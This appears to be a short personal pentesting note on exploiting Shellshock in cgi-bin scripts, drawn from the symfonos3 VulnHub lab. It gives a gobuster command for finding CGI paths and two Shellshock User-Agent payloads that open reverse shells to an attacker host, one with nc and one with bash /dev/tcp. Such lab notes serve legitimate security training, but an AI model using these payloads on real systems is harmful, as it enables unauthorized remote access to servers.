<https://www.exploit-db.com/docs/48112>

When you see cgi-bin from a directory scan, Shellshock might be your way in.


In User-Agent: () { :;}; /bin/bash -c ‘nc 192.168.234.166 1337 -e /bin/sh’

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u <http://192.168.1.48>

From symfonos3, vulnhub
(nc version did not work, but bash did)

User-Agent: () { :;}; /bin/bash -c 'exec bash -i &>/dev/tcp/192.168.1.42/443 <&1'



we get a shell ; )![unnamed_064c41d2d6be4aa1a1321b21f243dbd9](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/6.%20Web%20CVEs/Shellshock/{{notename}}-202605011506.png)
